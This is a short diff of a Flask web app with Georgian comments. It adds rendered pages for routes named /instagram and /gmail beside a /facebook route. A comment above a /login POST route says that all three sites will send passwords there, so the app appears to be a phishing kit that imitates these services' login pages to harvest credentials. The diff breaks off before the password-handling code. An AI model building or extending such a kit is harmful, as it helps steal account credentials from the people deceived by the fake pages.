@@ -15,12 +15,12 @@ def facebook():
 # ინსტაგრამი
 @app.route('/instagram')
 def instagram():
-    return "<h1>instagram-ის გვერდი მზადების პროცესშია</h1>"
+    return render_template('instagram.html')
 
 # მეილი
 @app.route('/gmail')
 def gmail():
-    return "<h1>gmail-ის გვერდი მზადების პროცესშია</h1>"
+    return render_template('gmail.html')
 
 # მონაცემების მიღება (სამივე საიტი აქ გამოაგზავნის პაროლებს)
 @app.route('/login', methods=['POST'])
